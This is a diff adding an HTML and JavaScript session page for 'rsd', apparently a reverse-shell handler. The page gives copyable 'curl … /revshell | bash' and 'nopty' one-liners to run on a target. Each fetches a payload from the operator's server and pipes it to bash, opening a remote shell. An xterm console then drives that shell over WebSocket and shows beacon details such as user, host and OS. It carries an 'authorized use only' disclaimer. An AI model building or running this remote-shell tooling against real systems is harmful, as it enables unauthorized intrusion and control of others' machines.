@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>rsd session</title>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@xterm/xterm@5.5.0/css/xterm.min.css">
+<link rel="stylesheet" href="/static/common.css">
+<style>
+body { display: flex; flex-direction: column; height: 100vh; font-family: ui-monospace, monospace; }
+.session-header { display: flex; align-items: center; gap: 0.75rem; flex: 1; }
+.session-header h1 { font-size: 0.95rem; font-weight: 600; color: var(--text); font-family: inherit; }
+#status { font-size: 0.75rem; padding: 0.2rem 0.6rem; border-radius: 12px; }
+.connected { background: var(--success-bg); color: var(--success-fg); }
+.disconnected { background: var(--warn-bg); color: var(--warn-fg); }
+.waiting { background: var(--warn-bg); color: var(--warn-fg); }
+#callback { padding: 0.75rem 1.25rem; background: var(--bg-elevated); border-bottom: 1px solid var(--border); font-size: 0.85rem; }
+#callback > label { color: var(--text-muted); font-family: -apple-system, sans-serif; font-size: 0.8rem; }
+#copy-rows { margin-top: 0.5rem; }
+#terminal { flex: 1; padding: 0.5rem; min-height: 0; }
+#info { padding: 0.4rem 1.25rem; background: var(--bg-elevated); border-top: 1px solid var(--border); font-size: 0.75rem; color: var(--text-muted); font-family: -apple-system, sans-serif; }
+</style>
+</head>
+<body>
+<header class="topbar">
+  <div class="session-header">
+    <a href="/" class="brand">
+      <div class="brand-logo">rsd</div>
+      <div class="brand-text">
+        <span class="brand-name">rsd</span>
+        <span class="brand-version" id="rsd-version">v0.0.0</span>
+      </div>
+    </a>
+    <h1 id="title">session</h1>
+    <span id="status" class="waiting">waiting</span>
+  </div>
+  <div class="topbar-actions">
+    <button type="button" class="btn icon-btn" id="theme-toggle" title="Toggle theme">☀️</button>
+    <a href="/" class="btn">All sessions</a>
+  </div>
+</header>
+
+<div id="callback">
+  <label>Run on target</label>
+  <div id="copy-rows"></div>
+</div>
+<div id="terminal"></div>
+<div id="info"></div>
+
+<div id="disclaimer-modal" class="modal-overlay hidden">
+  <div class="modal">
+    <h2>Authorized use only</h2>
+    <p>This tool is intended for authorized security testing, research, and lab environments only. You must have explicit permission before use on any system you do not own or control.</p>
+    <p>The author is not responsible for misuse, damage, or legal consequences arising from use of this software.</p>
+    <button type="button" class="btn btn-primary" id="disclaimer-accept">I understand</button>
+  </div>
+</div>
+
+<script>window.RSD_VERSION = '__RSD_VERSION__';</script>
+<script src="/static/common.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@xterm/xterm@5.5.0/lib/xterm.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@xterm/addon-fit@0.10.0/lib/addon-fit.min.js"></script>
+<script>
+const parts = window.location.pathname.split('/').filter(Boolean);
+const sessionID = parts[parts.length - 1];
+
+// Save token from URL to localStorage for multi-session
+const urlToken = new URLSearchParams(location.search).get('t');
+if (urlToken) {
+  rsdSaveSession({ id: sessionID, token: urlToken, name: sessionID, createdAt: Date.now() });
+  history.replaceState({}, '', '/' + sessionID);
+}
+const sessionToken = urlToken || rsdGetSessionToken(sessionID);
+
+document.getElementById('title').textContent = sessionID;
+rsdInitTopbar();
+
+const callbackURL = location.origin + '/' + sessionID + '/revshell';
+const fullCmd = 'curl -fsSL ' + callbackURL + ' | bash';
+const copyEl = document.getElementById('copy-rows');
+rsdAddCopyRow(copyEl, 'full', fullCmd);
+rsdAddCopyRow(copyEl, 'nopty', 'curl -fsSL ' + location.origin + '/' + sessionID + '/nopty | bash');
+rsdAddCopyRow(copyEl, 'url', callbackURL);
+
+let termTheme = { background: '#0d1117', foreground: '#c9d1d9', cursor: '#58a6ff' };
+function applyTermTheme() {
+  const light = document.documentElement.dataset.theme === 'light';
+  termTheme = light
+    ? { background: '#ffffff', foreground: '#1f2328', cursor: '#0969da' }
+    : { background: '#0d1117', foreground: '#c9d1d9', cursor: '#58a6ff' };
+  if (term) term.options.theme = termTheme;
+}
+const term = new Terminal({ cursorBlink: true, fontSize: 14, theme: termTheme });
+const fitAddon = new FitAddon.FitAddon();
+term.loadAddon(fitAddon);
+term.open(document.getElementById('terminal'));
+fitAddon.fit();
+window.addEventListener('resize', () => fitAddon.fit());
+window.addEventListener('rsd-theme', applyTermTheme);
+applyTermTheme();
+
+const statusEl = document.getElementById('status');
+const infoEl = document.getElementById('info');
+
+function setStatus(state, text) {
+  statusEl.className = state;
+  statusEl.textContent = text;
+}
+
+let beaconMode = null;
+let attachOpen = false;
+let resizeTimer = null;
+
+function formatBeaconInfo(t) {
+  if (!t) return null;
+  const parts = [`${t.user || '?'}@${t.host || '?'}`, t.mode || 'unknown'];
+  if (t.system && t.system.os_name) parts.push(t.system.os_name);
+  else if (t.os) parts.push(t.os + (t.arch ? '-' + t.arch : ''));
+  return parts.join(' · ');
+}
+
+function updateSessionInfo() {
+  refreshBeaconMode();
+}
+
+async function refreshBeaconMode() {
+  try {
+    const res = await fetch('/web/sessions/' + sessionID, { credentials: 'include' });
+    if (!res.ok) return;
+    const data = await res.json();
+    const live = data.targets && data.targets.length > 0 ? data.targets[data.targets.length - 1] : null;
+    const t = live || data.last_target;
+    beaconMode = t && t.mode ? t.mode : null;
+    const label = formatBeaconInfo(t);
+    if (label) {
+      infoEl.textContent = label;
+      setStatus('connected', beaconMode === 'command' ? 'command' : 'pty');
+    } else if (attachOpen) {
+      infoEl.textContent = 'Waiting for target callback…';
+      setStatus('connected', 'connected');
+    }
+  } catch (_) {}
+}
+
+function connect() {
+  if (!sessionToken) {
+    setStatus('disconnected', 'no token');
+    infoEl.textContent = 'Open this session from the hub or use a link with ?t=';
+    return;
+  }
+  const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
+  const ws = new WebSocket(`${proto}//${location.host}/${sessionID}/attach?t=${encodeURIComponent(sessionToken)}`);
+  ws.binaryType = 'arraybuffer';
+
+  let beaconInfoPolled = false;
+  ws.onopen = () => {
+    attachOpen = true;
+    beaconInfoPolled = false;
+    setStatus('connected', 'connected');
+    updateSessionInfo();
+  };
+  ws.onmessage = (ev) => {
+    const data = ev.data instanceof ArrayBuffer ? new Uint8Array(ev.data) : ev.data;
+    term.write(data);
+    if (!beaconInfoPolled) {
+      beaconInfoPolled = true;
+      updateSessionInfo();
+    }
+  };
+  ws.onclose = () => {
+    attachOpen = false;
+    setStatus('disconnected', 'disconnected');
+    infoEl.textContent = 'Connection lost. Reconnecting…';
+    setTimeout(connect, 3000);
+  };
+  ws.onerror = () => ws.close();
+
+  term.onData((data) => {
+    if (ws.readyState === WebSocket.OPEN) {
+      ws.send(new TextEncoder().encode(data));
+    }
+  });
+  term.onResize(({cols, rows}) => {
+    if (beaconMode === 'command') return;
+    if (ws.readyState !== WebSocket.OPEN) return;
+    clearTimeout(resizeTimer);
+    resizeTimer = setTimeout(() => {
+      if (ws.readyState === WebSocket.OPEN) {
+        ws.send(JSON.stringify({type: 'resize', cols, rows}));
+      }
+    }, 80);
+  });
+}
+
+setStatus('waiting', 'connecting…');
+connect();
+setInterval(refreshBeaconMode, 2000);
+</script>
+</body>
+</html>
